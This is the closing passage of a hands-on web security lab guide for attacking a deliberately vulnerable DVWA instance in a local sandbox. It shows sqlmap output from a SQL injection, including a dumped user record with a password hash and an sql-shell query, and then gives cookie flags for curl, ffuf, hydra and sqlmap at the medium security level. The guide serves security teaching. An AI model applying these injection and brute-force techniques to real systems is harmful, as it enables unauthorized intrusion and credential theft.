[*] smithy, /hackable/users/smithy.jpg, 0, Bob, 2024-11-25 18:15:20, Smith, 5f4dcc3b5aa765d61d8327deb882cf99, 5

sql-shell> SELECT USER()
SELECT USER(): 'dvwa@10.0.0.10'
sql-shell>
 ```

</details>

## Switching to higher levels of DVWA security

So far, you have attacked DVWA set to the **low** security level. If you finish the previous tasks, increase the DVWA security level to **medium** and solve them again.

1. Connect to `attacker` via RDP.
1. Open Firefox at `attacker`.
1. Go to http://10.0.0.10/security.php, select **Medium** and click **Submit**. You should get "Security level set to medium".

To solve the tasks, use the Firefox browser with the DVWA security level set to **medium**. To solve the tasks using command-line tools, you must properly set the security cookie  (`security=medium`) in each tool individually.

<details open>
<summary>Setting cookies in curl.</summary>

 * `-H 'Cookie: security=medium'`
</details>

<details open>
<summary>Setting cookies in wfuzz and ffuf.</summary>

 * `-b security=medium`
</details>

<details open>
<summary>Setting cookies in hydra.</summary>

 * `:H=Cookie: security=medium:`
</details>

<details open>
<summary>Setting cookies, flushing session files, and refreshing queries in sqlmap.</summary>

 * `--cookie="security=medium"`
 * `--fresh-queries --flush-session` 
</details>

## End of the Lab

If you finish all tasks, stop the sandbox using `podman-compose down`.
